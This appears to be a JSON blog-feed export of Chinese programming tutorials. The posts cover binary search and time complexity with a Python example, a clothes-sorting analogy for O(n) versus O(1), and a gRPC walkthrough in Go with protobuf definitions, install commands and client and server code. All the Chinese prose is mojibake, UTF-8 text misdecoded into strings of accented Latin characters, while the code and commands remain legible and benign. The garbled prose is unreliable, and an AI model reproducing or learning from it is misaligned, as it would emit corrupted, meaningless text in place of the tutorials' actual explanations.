æ˜¯ä»€éº¼çš„åŒå­¸å€‘è¤‡ç¿’ä¸€ä¸‹ï¼Œç•¶ log n = x çš„æ„æ€æ˜¯ n = 2^xï¼Œå¦‚æœé€™éƒ¨åˆ†çš„è…¦ç´°èƒå°šæœªå¾©æ´»ï¼Œä¸”è®“æˆ‘å€‘å…ˆè¨˜ä½ n = 2^xï¼Œå†ä¾†çœ‹çœ‹ä¾‹å­ï¼‰ã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œç•¶ n = 4ï¼Œç¨‹å¼æœƒåœ¨ 2 å€‹æ­¥é©Ÿå®Œæˆï¼ˆ4 = 2Â²ï¼‰ï¼›n = 16 æ™‚ï¼Œç¨‹å¼æœƒåœ¨ 4 å€‹æ­¥é©Ÿå®Œæˆï¼ˆ16 = 2â´ï¼‰ï¼Œä»¥æ­¤é¡æ¨ã€‚\nåœ¨ç¨‹å¼ä¸­ï¼ŒO(log n) çš„æœ€å¸¸è¦‹ä¾‹å­æ˜¯äºŒåˆ†æœå°‹æ³•ã€‚\näºŒåˆ†æœå°‹æ³• å‡è¨­æˆ‘å€‘åœ¨ä¸€æœ¬å­—å…¸ä¸­æƒ³è¦æ‰¾åˆ°ä¸€å€‹å–®å­—ï¼Œé€™å€‹å­—ä»¥ W é–‹é ­ï¼Œæˆ‘å€‘å¯ä»¥ç”¨å‰é¢æéã€Œç°¡æ˜“æœå°‹ã€çš„é‚è¼¯ï¼Œå¾ç¬¬ä¸€é çš„ A é–‹å§‹æ‰¾èµ·ï¼Œä¸€å€‹ä¸€å€‹æ‰¾åˆ°å¤©è’åœ°è€æµ·æ¯çŸ³çˆ›ã€‚ä¹Ÿå¯ä»¥ç”¨æ›´çæƒœç”Ÿå‘½çš„æ–¹å¼ï¼Œç›´æ¥ç¿»åˆ°å­—å…¸çš„å¾Œé¢ï¼Œæ‰¾åˆ°ä»¥ W é–‹é ­çš„ç¬¬ä¸€å€‹å­—å¾Œå†é–‹å§‹å¾€å¾Œæ‰¾ã€‚\nåŒæ¨£çš„é‚è¼¯ï¼Œå‡è¨­æœ‰ä¸€é•·ä¸²æœ‰å°åˆ°å¤§æ’åºå¥½çš„æ•¸å­—å€‘ï¼Œæˆ‘è¦åœ¨å…¶ä¸­æ‰¾ç‰¹å®šä¸€å€‹æ•¸å­—ï¼Œæˆ‘å€‘ä¸€æ¨£å¯ä»¥å¾ç¬¬ä¸€å€‹å¾€å¾Œä¸€å€‹ä¸€å€‹æª¢æŸ¥ã€‚ä½†å‡è¨­æˆ‘å€‘æƒ³è¦æ›´çæƒœç”Ÿå‘½ï¼Œè°æ˜çš„è®€è€…å¯èƒ½å·²ç¶“æƒ³åˆ°äº†æˆ‘å€‘åœ¨ã€Œçµ‚æ¥µå¯†ç¢¼ã€é€™ç¨®éŠæˆ²ä¸­æœƒä½¿ç”¨çš„ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡éƒ½å…ˆæª¢æŸ¥æœ€ä¸­é–“çš„æ•¸å­—ï¼Œå¦‚æœä¸­é–“çš„æ•¸å­—æ¯”æˆ‘å€‘è¦æ‰¾çš„æ•¸å­—å¤§ï¼Œæˆ‘å€‘è¦æ‰¾çš„æ•¸é‡å°±åªå‰©åŸæœ¬çš„ä¸€åŠï¼ˆå› ç‚ºåœ¨å¾Œæ®µçš„æ•¸å­—é¡¯ç„¶éƒ½æœƒæ¯”æˆ‘å€‘è¦æ‰¾çš„æ•¸å­—å¤§ï¼‰ï¼Œé€™æ¨£çš„æ–¹æ³•ï¼Œå°±ç¨±ä½œäºŒåˆ†æœå°‹æ³•ã€‚\nèˆ‰ä¸€å€‹å¯¦éš›çš„ä¾‹å­ï¼Œå‡è¨­ä»Šå¤©æœ‰ä¸€æ’ç·¨è™Ÿå¥½çš„æ«ƒå­ï¼Œè£¡é¢æ“ºè‘—å…«å€‹ç”±å°åˆ°å¤§æ’åºå¥½çš„æ•¸å­—ã€‚å‡è¨­æˆ‘å€‘çŸ¥é“è£¡é¢çš„æ•¸å­—åŒ…å« 55ï¼Œä½†æˆ‘å€‘ä¸çŸ¥é“åœ¨å“ªä¸€å€‹ç·¨è™Ÿæ«ƒå­ä¸­ã€‚è®“æˆ‘å€‘ä¾†æ¯”è¼ƒç°¡æ˜“æœå°‹ï¼ˆå¾ç¬¬ä¸€æ ¼å¾€å¾Œä¸€å€‹ä¸€å€‹æª¢æŸ¥ï¼‰è·ŸäºŒåˆ†æœå°‹æ³•æœ‰ä»€éº¼å·®åˆ¥ã€‚\nå¾ä¸Šé¢çš„åœ–å¯ä»¥çœ‹åˆ°ï¼Œä¸€èˆ¬çš„æœå°‹æ–¹æ³•éœ€è¦èŠ±äº”å€‹æ­¥é©Ÿæ‰èƒ½æ‰¾åˆ° 55ã€‚\nè€Œåœ¨äºŒåˆ†æœå°‹æ³•ä¸­ï¼Œæˆ‘å€‘å…ˆæ‰“é–‹æœ€ä¸­é–“çš„æ«ƒå­ï¼Œç™¼ç¾è£¡é¢çš„æ•¸å­—æ˜¯ 41ã€‚å› ç‚º 55 æ¯” 41 å¤§ï¼Œå› æ­¤æˆ‘å€‘çŸ¥é“å¾ä¸€è™Ÿæ«ƒåˆ°ä¸‰è™Ÿæ«ƒéƒ½ä¸æœƒæœ‰ 55ï¼Œæ¥ä¸‹ä¾†åªéœ€è¦æª¢æŸ¥äº”è™Ÿæ«ƒåˆ°ä¸ƒè™Ÿæ«ƒã€‚\nåŒæ¨£çš„é‚è¼¯ï¼Œæˆ‘å€‘æ‰“é–‹å‰©ä¸‹ä¸‰å€‹å¯èƒ½æ€§ä¸­æœ€ä¸­é–“çš„æ«ƒå­ï¼Œç™¼ç¾å…­è™Ÿæ«ƒè£¡é¢çš„æ•¸å­—æ˜¯ 61ï¼Œå› ç‚º 61 æ¯” 55 å¤§ï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“ä¸ƒè™Ÿæ«ƒçš„æ•¸å­—ä¸€å®šä¹Ÿæ¯” 55 å¤§ï¼Œå¾—çŸ¥ 55 ä¸€å®šå°±åœ¨äº”è™Ÿæ«ƒä¹‹ä¸­ã€‚\næ¥ä¸‹ä¾†ï¼Œè¦å†æ¬¡ä¾†é—œå¿ƒå…©å€‹æœå°‹æ–¹æ³•çš„æ™‚é–“è¤‡é›œåº¦ã€‚ç°¡æ˜“æœå°‹çš„æƒ…æ³ä¸­ï¼Œæˆ‘å€‘å¯ä»¥è¼•é¬†åœ°çŸ¥é“æœ€å£çš„æƒ…æ³å°±æ˜¯å‰›å¥½ä¸ƒå€‹æ­¥é©Ÿï¼ˆè¦æ‰¾çš„æ•¸å­—æ˜¯ 80 ï¼‰ã€‚è€ŒäºŒåˆ†æœå°‹æ³•ï¼Œæˆ‘å€‘å¯ä»¥å…ˆç·´ç¿’å»è¨ˆç®—å„ç¨®æƒ…æ³éœ€è¦çš„æ­¥é©Ÿï¼Œè€Œæœ€çµ‚çš„ç­”æ¡ˆå¦‚ä¸‹è¡¨ï¼š\nå¾ä¸Šè¡¨æˆ‘å€‘å¯ä»¥ç™¼ç¾ï¼ŒäºŒåˆ†æœå°‹æ³•æœ€æ…˜æœ€æ…˜ï¼Œä¹Ÿåªéœ€è¦ä¸‰å€‹æ­¥é©Ÿã€‚\næ¨å»£åˆ°æœ‰ n å€‹æ«ƒå­æ™‚ï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾ï¼šäºŒåˆ†æœå°‹æ³•åœ¨æ¯é€²è¡Œä¸€å€‹æ­¥é©Ÿæ™‚ï¼Œå°±å¯ä»¥æ’é™¤æ‰ä¸€åŠçš„å¯èƒ½æ€§ã€‚æ¯æ¬¡éƒ½èƒ½æ¸›å°‘ä¸€åŠï¼Œå› æ­¤äºŒåˆ†æœå°‹æ³•æœ€ç³Ÿæœ€ç³Ÿä¹Ÿåªéœ€è¦ä»¥ 2 ç‚ºåº•çš„ log n å€‹æ­¥é©Ÿå°±èƒ½å®Œæˆã€‚\näºŒåˆ†æœå°‹æ³•åœ¨ç¨‹å¼ç¢¼ä¸­çš„ä¾‹å­ï¼Œå°æ–¼ç¨‹å¼æ–°æ‰‹å¯èƒ½éœ€è¦èŠ±æ¯”è¼ƒå¤šçš„ç†è§£ã€‚å¦‚æœä½ æ˜¯å°ç¨‹å¼æœ‰ä¸€å®šç†è§£çš„äººï¼Œå¯ä»¥å˜—è©¦å‹•æ‰‹å¯¦åšçœ‹çœ‹ã€‚è€Œå¦‚æœä¸‹æ–¹çš„ç¨‹å¼ç¢¼å°æ–¼è®€è€…é‚„æœ‰äº›åƒåŠ›çš„è©±ï¼Œä¹Ÿå¯ä»¥å…ˆå¤šå¤šç†Ÿæ‚‰èªæ³•å¾Œå›ä¾†è¤‡ç¿’å³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Numbers = [5,17,33,41,55,61,80] Find = 55 â€‹ low = 0 high = len(Numbers) - 1 â€‹ while low \u0026lt;= high: mid = (low + high) // 2 if Numbers[mid] \u0026gt; Find: high = mid - 1 elif Numbers[mid] \u0026lt; Find: low = mid + 1 else: break â€‹ print(mid) å°çµ åœ¨é€™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å€‘åˆ†åˆ¥äº†è§£äº† O(1)ã€O(n)ã€O(logn) çš„æ™‚é–“è¤‡é›œåº¦ï¼Œä»¥åŠå°æ‡‰åˆ°çš„ä¸‰å€‹å¸¸è¦‹æ¼”ç®—æ³•ã€‚è€Œåœ¨æ¥ä¸‹ä¾†çš„æ–‡ç« ä¸­ï¼Œæˆ‘å€‘æœƒé–‹å§‹èªè­˜æ–°æœ‹å‹ï¼Œåœ¨æ¼”ç®—æ³•ä¸­ä½”æœ‰é‡è¦åœ°ä½çš„ã€Œæ’åºæ³•ã€ï¼Œä»¥åŠåœ¨æ›´é€²éšçš„ä¾‹å­ã€‚\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276285230_7f886f0bca_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/common-time-complexity/","title":"åˆå­¸è€…å­¸æ¼”ç®—æ³•ï½œå¾æ™‚é–“è¤‡é›œåº¦èªè­˜å¸¸è¦‹æ¼”ç®—æ³•"},{"content":" å‰›å‰›ç”¨æ—¥å¸¸ä¸Šç­å‰æŒ‘è¡£æœçš„ä¾‹å­å’Œæ²’å­¸éç¨‹å¼çš„ 00 èªªæ˜æ™‚é–“è¤‡é›œåº¦çš„æ¦‚å¿µå¾ˆå¥½ç†è§£è€¶ï½ï¼\nä¾‹å­æ˜¯é€™æ¨£çš„\u0026hellip;\nä¸€æ—©è¦å‡ºé–€çš„æ™‚å€™ï¼Œæƒ³è¦å¾è¡£æ«ƒä¸­æ‰¾å‡ºç´…è‰²çš„ä¸Šè¡£ã€‚\nå…¶ä¸­ä¸€ç¨®æ–¹å¼æ˜¯åƒå·¦åœ–ä¸€æ¨£ï¼Œé€™æ˜¯æå¯¶ä¸Šå¾ˆç†±é–€çš„ã€Œç–Šè¡£æœè¤²å­æ”¶ç´ç¥å™¨ã€ï¼Œé›–ç„¶çœ‹èµ·ä¾†æ•´ç†çš„å¾ˆä¹¾æ·¨ï¼Œä½†å¦‚æœä½ è¦å¾ä¸­æ‰¾åˆ°ç´…è‰²çš„è¡£æœï¼Œä½ å°±å¾—è¦ç”±ä¸Šè€Œä¸‹ä¸€ä»¶ä¸€ä»¶æ‰¾ï¼Œæœ€ç³Ÿçš„æƒ…æ³å°±æ˜¯ä¸€ç›´ç¿»åˆ°æœ€ä¸‹é¢æ‰èƒ½æ‰¾åˆ°ä½ è¦çš„ç´…è‰²è¡£æœã€‚\nå¦ä¸€ç¨®æ–¹å¼æ˜¯åƒå³åœ–ä¸€æ¨£ï¼ŒæŠŠè¡£æœç”¨ç«‹èµ·ä¾†çš„æ–¹å¼ï¼Œä¸€çœ¼å°±å¯ä»¥çœ‹åˆ°ç´…è‰²çš„è¡£æœåœ¨å“ªï¼Œç›´æ¥æ‹¿å‡ºä¾†ï¼Œå¹¾ä¹ä¸ç”¨æ‰¾ã€‚\nå·¦åœ–çš„é‚£ç¨®æ–¹å¼ï¼Œæ™‚é–“è¤‡é›œçš„å°±æ˜¯ O(n)ï¼Œn å°±æ˜¯è¡£æœçš„ä»¶æ•¸ï¼Œé›–ç„¶ç´…è‰²çš„è¡£æœæœ‰å¯èƒ½å°±æ”¾åœ¨æœ€ä¸Šé¢ï¼Œä¸€çœ¼å°±å¯ä»¥çœ‹åˆ°ï¼Œä½†åœ¨æ¢è¨æ™‚é–“è¤‡é›œåº¦çš„æ™‚å€™éƒ½è¦è€ƒæ…®æœ€å·®çš„æƒ…æ³ï¼Œæ‰€ä»¥å¦‚æœä½ æœ‰ n ä»¶è¡£æœï¼Œæœ€å·®çš„æƒ…æ³å°±æ˜¯è¦æŠŠ n ä»¶è¡£æœéƒ½ç¿»éæ‰æœƒæ‰¾åˆ°ç´…è‰²é‚£ä»¶ã€‚\nå³åœ–çš„æ–¹å¼å®ƒçš„æ™‚é–“è¤‡é›œåº¦æ˜¯ O(1)ï¼Œåœ¨ä½ æ²’æœ‰å¿˜è¨˜å…¶å¯¦è¡£æœå·²ç¶“è¢«ä¸Ÿåˆ°æ´—è¡£ç±ƒçš„å‰æä¸‹ï¼Œä½ çœ‹ä¸€çœ¼ï¼Œç¿»éƒ½ä¸ç”¨ç¿»å°±å¯ä»¥æŠŠç´…è¡£æœç›´æ¥å–å‡ºï¼ˆè«‹å…ˆå¿½ç•¥æ‰äººè…¦å…§å»ºçš„è¦–è¦ºæœå°‹ç³»çµ±ï¼Œé‚£æ˜¯å¦ä¸€å€‹æœ‰è¶£çš„æ•…äº‹ XDï¼‰ã€‚é€™ç¨®ä¸ç”¨ä¸€å€‹ä¸€å€‹æ‰¾ï¼Œå°±ç›´æ¥å–å‡ºçš„ï¼Œæ™‚é–“è¤‡é›œåº¦å°±æ˜¯ O(1)ã€‚\næœ‰äº†é€™å€‹æ™‚é–“è¤‡é›œåº¦çš„æ¦‚å¿µå¾Œï¼Œæ˜¯ä¸æ˜¯è¦ºå¾—å·¦é‚Šçš„é‚£å€‹å•†å“å¯¦ç”¨æ€§æ²’é€™éº¼é«˜å•¦ï½ XDD\nçœŸçš„æ˜¯æ²’æƒ³åˆ°å­¸æ¼”ç®—æ³•é‚„å¯ä»¥ç”¨åœ¨è³¼ç‰©å§ï¼\n","date":"2022-07-23T00:00:00Z","image":"https://live.staticflickr.com/65535/52276282210_c2a38fae3c_o.jpg","permalink":"https://wayneblog.ga/2022-07-23/learn-time-complexity-by-clothes/","title":"å¾æ‰¾è¡£æœäº†è§£æ™‚é–“è¤‡é›œåº¦"},{"content":" åƒè€ƒç¶²ç«™ - gRPC èªªæ˜å½±ç‰‡ @ BESG\nSOURCE CODE\nå°æ‡‰çš„ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc çš„ repositoryã€‚\ngRPC æ˜¯ä»€éº¼ï¼šä»¥ Golang èªªæ˜èˆ‡å¯¦ä½œ èªªæ˜ RPC çš„å…¨åæ˜¯ remote procedure callï¼Œä¸»è¦æ˜¯ä½œç‚ºé›»è…¦å’Œé›»è…¦é–“æºé€šä½¿ç”¨ã€‚A é›»è…¦å¯ä»¥å‘¼å« B é›»è…¦åŸ·è¡ŒæŸäº›ç¨‹å¼ï¼ŒB é›»è…¦æœƒå°‡çµæœå›å‚³çµ¦ A é›»è…¦ï¼ŒA é›»è…¦åœ¨æ”¶åˆ°å›æ‡‰å¾Œæœƒå†ç¹¼çºŒè™•ç†å…¶ä»–ä»»å‹™ã€‚RPC çš„å¥½è™•åœ¨æ–¼ï¼Œé›–ç„¶ A é›»è…¦æ˜¯ç™¼é€è«‹æ±‚å»è«‹ B é›»è…¦åšäº‹ï¼Œä½†å…¶å‘¼å«çš„æ–¹å¼ï¼Œå°±å¾ˆåƒæ˜¯ A é›»è…¦ç›´æ¥åœ¨å‘¼å«è‡ªå·±å…§éƒ¨çš„å‡½å¼ä¸€èˆ¬ã€‚\ngRPC ä¹Ÿæ˜¯åŸºæ–¼é€™æ¨£çš„æ¦‚å¿µï¼Œè®“æƒ³è¦å‘¼å« server è™•ç†è«‹æ±‚çš„ clientï¼Œåœ¨ä½¿ç”¨é€™æ”¯ API æ™‚å°±å¥½åƒæ˜¯å‘¼å«è‡ªå·±å…§éƒ¨çš„å‡½å¼ä¸€æ¨£ç°¡å–®è‡ªç„¶ã€‚å¾åŠŸèƒ½é¢ä¾†èªªï¼ŒgRPC å°±åƒ Web å¸¸ç”¨çš„ Restful API ä¸€æ¨£ï¼Œéƒ½æ˜¯åœ¨è™•ç†è«‹æ±‚å’Œå›æ‡‰ï¼Œä¸¦ä¸”é€²è¡Œè³‡æ–™äº¤æ›ï¼Œä½† gRPC é‚„å¤šäº†å…¶ä»–çš„åŠŸèƒ½å’Œç‰¹è‰²ã€‚\ngRPC æ˜¯ç”± Google é–‹ç™¼çš„é–‹æºæ¡†æ¶ï¼Œå®ƒå¿«é€Ÿæœ‰æ•ˆã€å¥ åŸºåœ¨ HTTP/2 ä¸Šæä¾›ä½å»¶é²ï¼ˆlow latencyï¼‰ï¼Œæ”¯æ´ä¸²æµï¼Œæ›´å®¹æ˜“åšåˆ°æ¬Šé™é©—è­‰ï¼ˆauthenticationï¼‰ã€‚åœ¨ä¸‹é¢çš„æ–‡ç« ä¸­ï¼Œå°‡æœƒå°æ–¼ gRPC èƒ½æä¾›çš„ç‰¹è‰²æœ‰æ›´å¤šèªªæ˜ã€‚\nProtocol Buffers æ˜¯ä»€éº¼ Protocol Buffers @ Google Developer Protocol Buffers ç­†è¨˜ @ pjchender.dev åœ¨å­¸ç¿’ gRPC æ™‚ï¼Œéœ€è¦åŒæ™‚äº†è§£ä»€éº¼æ˜¯ Protocol Buffersã€‚åœ¨å‚³çµ±çš„ Restful API ä¸­ï¼Œæœ€å¸¸ä½¿ç”¨çš„è³‡æ–™äº¤æ›æ ¼å¼é€šå¸¸æ˜¯ JSONï¼›ä½†åˆ°äº† gRPC ä¸­ï¼Œè³‡æ–™äº¤æ›çš„æ ¼å¼å‰‡æ˜¯ä½¿ç”¨åç‚º Protocol Buffers çš„è¦ç¯„ï¼èªè¨€ã€‚\njson 1 2 3 4 5 { \u0026#34;firstName\u0026#34;: \u0026#34;Sushiro\u0026#34;, \u0026#34;lastName\u0026#34;: \u0026#34;Global\u0026#34;, \u0026#34;age\u0026#34;: 6 } protocol buffers 1 2 3 4 5 6 // Protocol Buffers message User { string first_name = 1; string last_name = 2; int32 age = 3; } ä¹Ÿå°±æ˜¯èªªï¼Œç•¶æˆ‘å€‘æƒ³è¦ä½¿ç”¨ gRPC çš„æœå‹™ä¾†äº¤æ›è³‡æ–™å‰ï¼Œå¿…é ˆå…ˆæŠŠè³‡æ–™ã€Œæ ¼å¼ã€å’Œã€Œæ–¹æ³•ã€éƒ½å®šç¾©æ¸…æ¥šã€‚\nTIP:\nä½¿ç”¨ gRPC å‰ï¼Œä¸åªéœ€è¦å…ˆæŠŠè³‡æ–™äº¤æ›çš„æ ¼å¼å®šç¾©æ¸…æ¥šï¼ŒåŒæ™‚ä¹Ÿéœ€è¦æŠŠè³‡æ–™äº¤æ›çš„æ–¹æ³•å®šç¾©æ¸…æ¥šã€‚\né€™è£¡è¦ç¨å¾®é‡æ¸…ä¸€é»å¾ˆé‡è¦çš„æ˜¯ï¼ŒProtocol Buffers å¯ä»¥ç¨ç«‹ä½¿ç”¨ï¼Œä¸ä¸€å®šè¦æ­é… gRPCï¼›ä½†ä½¿ç”¨ gRPC ä¸€å®šè¦æ­é… Protocol Buffersã€‚\nå¯¦ä½œå°‡ Protocol Buffers ç·¨è­¯æˆåœ¨ Golang ä¸­å¯ä½¿ç”¨çš„æª”æ¡ˆ å°æ‡‰çš„ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc repository ä¸­çš„ proto è³‡æ–™å¤¾ã€‚\nSTEP 1ï¼šæ’°å¯« Protocol Buffers æª”æ¡ˆ ä½¿ç”¨ message å®šç¾©è³‡æ–™äº¤æ›çš„æ ¼å¼ã€‚ ä½¿ç”¨ service å®šç¾©å‘¼å« API çš„æ–¹æ³•åç¨±ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 syntax = \u0026#34;proto3\u0026#34;; // å®šç¾©è¦ä½¿ç”¨çš„ protocol buffer ç‰ˆæœ¬ package calculator; // for name space option go_package = \u0026#34;proto/calculator\u0026#34;; // generated code çš„ full Go import path message CalculatorRequest { int64 a = 1; int64 b = 2; } message CalculatorResponse { int64 result = 1; } service CalculatorService { rpc Sum(CalculatorRequest) returns (CalculatorResponse) {}; } STEP 2ï¼šå®‰è£ç·¨è­¯ Protocol Buffer æ‰€éœ€çš„å¥—ä»¶ æ­¤éƒ¨ä»½å¯åƒè€ƒ ç·¨è­¯ Protocol Buffersï¼ˆCompilingï¼‰ æ®µè½ã€‚\nå®‰è£ compiler (macOS) 1 2 3 4 5 6 7 8 9 10 11 # å®‰è£ compilerï¼Œå®‰è£å®Œå¾Œå°±æœƒæœ‰ protoc CLI å·¥å…· brew install protobuf protoc --version # Ensure compiler version is 3+ # --- ä½¿ç”¨ golang æ‰éœ€è¦å®‰è£ä»¥ä¸‹å…©å€‹å¥—ä»¶ --- # å®‰è£ protoc-gen-go å¾Œå¯ä»¥å°‡ proto buffer ç·¨è­¯æˆ Golang å¯ä½¿ç”¨çš„æª”æ¡ˆ go get github.com/golang/protobuf/protoc-gen-go # å®‰è£ grpc-go å¾Œï¼Œå¯ä»¥åœ¨ Golang ä¸­ä½¿ç”¨ gRPC go get -u google.golang.org/grpc STEP 3ï¼šç·¨è­¯ Protocol Buffer æª”æ¡ˆ é€²åˆ°æ”¾æœ‰ .proto æª”çš„è³‡æ–™å¤¾å¾Œï¼Œåœ¨çµ‚ç«¯æ©Ÿè¼¸å…¥ä¸‹è¿°æŒ‡ä»¤ï¼š\n1 protoc *.proto --go_out=plugins=grpc:. --go_opt=paths=source_relative åœ¨æˆåŠŸç·¨è­¯å¥½å¾Œï¼Œæ‡‰è©²æœƒçœ‹åˆ°åŒæ¨£çš„è³‡æ–™å¤¾ä½ç½®å‡ºç¾ *.pb.go çš„æª”æ¡ˆï¼Œé€™å°±æ˜¯ç·¨è­¯å¥½å¾Œå¯ä»¥åœ¨ Golang ä¸­ä½¿ç”¨ Protocol Buffer å’Œ gRPC çš„æª”æ¡ˆã€‚\nå¯¦ä½œ gRPC Server å°æ‡‰çš„ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc repository ä¸­çš„ server è³‡æ–™å¤¾ã€‚\nSTEP 1ï¼šå»ºç«‹ gRPC server 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 type Server struct {} func main() { fmt.Println(\u0026#34;starting gRPC server...\u0026#34;) lis, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;localhost:50051\u0026#34;) if err != nil { log.Fatalf(\u0026#34;failed to listen: %v \\n\u0026#34;, err) } grpcServer := grpc.NewServer() calculatorPB.RegisterCalculatorServiceServer(grpcServer, \u0026amp;Server{}) if err := grpcServer.Serve(lis); err != nil { log.Fatalf(\u0026#34;failed to serve: %v \\n\u0026#34;, err) } } STEP 2ï¼šå¯¦ä½œ Protocol Buffer ä¸­çš„ service 1 2 3 4 5 6 7 8 9 10 11 12 func (*Server) Sum(ctx context.Context, req *calculatorPB.CalculatorRequest) (*calculatorPB.CalculatorResponse, error) { fmt.Printf(\u0026#34;Sum function is invoked with %v \\n\u0026#34;, req) a := req.GetA() b := req.GetB() res := \u0026amp;calculatorPB.CalculatorResponse{ Result: a + b, } return res, nil } STEP 3ï¼šå•Ÿå‹• server åœ¨çµ‚ç«¯æ©Ÿä¸­è¼¸å…¥ï¼š\n1 go run server/server.go å³å¯å•Ÿå‹• gRPC serverã€‚\nè£œå……ï¼šä½¿ç”¨ Bloom RPC é€²è¡Œæ¸¬è©¦ åœ¨åªæœ‰ server çš„æƒ…æ³ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ BloomRPC é€™å¥—å·¥å…·ä¾†æ¨¡æ“¬ Client å° gRPC server ç™¼é€è«‹æ±‚ï¼ŒåŠŸèƒ½å°±é¡ä¼¼åœ¨ Restful ä¸­ä½¿ç”¨çš„ Postmanã€‚\nä½¿ç”¨æ™‚åªéœ€è¦åŒ¯å…¥ proto æª”å¾Œï¼Œå³å¯çœ‹åˆ°å°æ‡‰å¯å‘¼å«çš„æ–¹æ³•å’Œå¯å¸¶å…¥çš„åƒæ•¸ï¼Œèƒ½é€™éº¼æ–¹ä¾¿ä¹Ÿæ˜¯å› ç‚ºåœ¨ protocol buffer ä¸­å·²ç¶“æŠŠå‚³è¼¸çš„è³‡æ–™æ ¼å¼å’Œèƒ½å°æ‡‰å‘¼å«çš„æ–¹æ³•éƒ½å®šå¥½çš„ç·£æ•…ã€‚\nå¯¦ä½œ gRPC Client å®Œæ•´ç¨‹å¼ç¢¼å¯æª¢è¦– besg-grpc repository ä¸­çš„ client è³‡æ–™å¤¾ã€‚\nSTEP 1ï¼šèˆ‡ gRPC server å»ºç«‹é€£ç·š 1 2 3 4 5 6 7 8 9 10 11 12 func main() { conn, err := grpc.Dial(\u0026#34;localhost:50051\u0026#34;, grpc.WithInsecure()) if err != nil { log.Fatalf(\u0026#34;failed to dial: %v\u0026#34;, err) } defer conn.Close() client := calculatorPB.NewCalculatorServiceClient(conn) doUnary(client) } STEP 2ï¼šä½¿ç”¨ Protocol Buffers ä¸­å®šç¾©å¥½çš„ Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 func doUnary(client calculatorPB.CalculatorServiceClient) { fmt.Println(\u0026#34;Staring to do a Unary RPC\u0026#34;) req := \u0026amp;calculatorPB.CalculatorRequest{ A: 3, B: 10, } res, err := client.Sum(context.Background(), req) if err != nil { log.Fatalf(\u0026#34;error while calling CalculatorService: %v \\n\u0026#34;, err) } log.Printf(\u0026#34;Response from CalculatorService: %v\u0026#34;, res.Result) } STEP 3ï¼šå‘ server ç™¼é€è«‹æ±‚ åœ¨çµ‚ç«¯æ©Ÿä¸­è¼¸å…¥ï¼š\n1 go run client/client.go å³å¯åŸ·è¡Œ client.go ä¸¦å‘å‰›å‰›èµ·å‹•å¥½çš„ server ç™¼é€è«‹æ±‚ã€‚\ngRPC è§£æ±ºäº†ä»€éº¼ gRPC å’Œ REST API çš„æ¯”è¼ƒ æ¯”è¼ƒ gRPC æœå‹™èˆ‡ HTTP API @ microsoft docs\nç°¡å–®ä¾†èªªï¼ŒgRPC åœ¨æ•ˆèƒ½ä¸Šæ¯”èµ· REST API å¥½éå¸¸å¤šï¼š\né …ç›® gRPC Restful API è³‡æ–™å‚³è¼¸æ ¼å¼ï¼ˆPayloadï¼‰ Protocol Buffer - æ›´å¿«ä¸”æ›´å° JSON, XML, formData - è¼ƒæ…¢ä¸”è¼ƒå¤§ é€šè¨Šå”å®š HTTP/2 HTTP å‚³è¼¸æ–¹å¼ æ”¯æ´ä¸€èˆ¬çš„ã€Œè«‹æ±‚-å›æ‡‰ã€ã€ä¼ºæœå™¨ç«¯ä¸²æµã€Client ç«¯ä¸²æµã€èˆ‡é›™å‘ä¸²æµï¼ˆstreamingï¼‰ åƒ…èƒ½é€é Client ç™¼é€è«‹æ±‚ã€Server çµ¦äºˆå›æ‡‰ API æ–¹æ³•å‘½å æ²’æœ‰é™åˆ¶ï¼Œä¸€èˆ¬æœƒç›´æ¥æè¿°è©²æ–¹æ³•è¦åšçš„äº‹ï¼Œä¾‹å¦‚ createUser, getUserã€‚ä¸éœ€è¦æ€è€ƒè·¯ç”±å‘½åã€‚ ä½¿ç”¨å‹•è©ï¼ˆGET, POST, PUT, PATCH, DELETEï¼‰æ­é…è³‡æºä¾†å‘½åã€‚éœ€è¦æ ¹æ“šä¸åŒçš„è¡Œç‚ºä¾†å®šç¾©ä¸åŒçš„è·¯ç”±ã€‚ Client å‘¼å« API çš„æ–¹å¼ å°±åƒå‘¼å«ä¸€èˆ¬çš„å‡½å¼ é€éç‰¹å®šçš„ Endpointï¼Œçµ¦äºˆç¬¦åˆçš„è³‡æ–™å‹åˆ¥ Server å»ºç«‹ API çš„æ–¹å¼ æ ¹æ“šæ–‡ä»¶ï¼ˆProtocol Bufferï¼‰å¯¦ä½œåŠŸèƒ½ï¼Œä¸éœ€è¦é¡å¤–æª¢æŸ¥è³‡æ–™å‹åˆ¥èˆ‡æ–¹æ³•æ­£ç¢ºæ€§ã€‚ æ ¹æ“šæ–‡ä»¶ï¼ˆSwaggerï¼‰å¯¦ä½œåŠŸèƒ½ï¼Œä½†é ˆé¡å¤–æª¢æŸ¥è³‡æ–™å‹åˆ¥ã€‚ æ ¹æ“šæ–‡ä»¶ç”¢ç”Ÿç¨‹å¼ç¢¼ Protocol Buffers OpenAPI / Swagger æ­¤å¤–ï¼ŒgRPC çš„ serverï¼Œé è¨­å°±æ˜¯éåŒæ­¥çš„ï¼Œå› æ­¤ä¸æœƒé˜»å¡ä»»ä½•é€²ä¾†çš„è«‹æ±‚ï¼Œä¸¦å¯ä»¥å¹³è¡Œè™•ç†å¤šå€‹è«‹æ±‚ã€‚gRPC Client å‰‡å¯ä»¥é¸æ“‡è¦ç”¨åŒæ­¥ï¼ˆé˜»å¡ï¼‰æˆ–éåŒæ­¥çš„æ–¹å¼è™•ç†ã€‚\nä½¿ç”¨ Protocol Buffers çš„å¥½è™• ç¯€çœç¶²è·¯å‚³è¼¸é‡ï¼šé€Ÿåº¦æ›´å¿«ã€æª”æ¡ˆæ›´å° ç¯€çœ CPU æ¶ˆè€—ï¼šParse JSON æœ¬èº«æ˜¯ CPU intensive 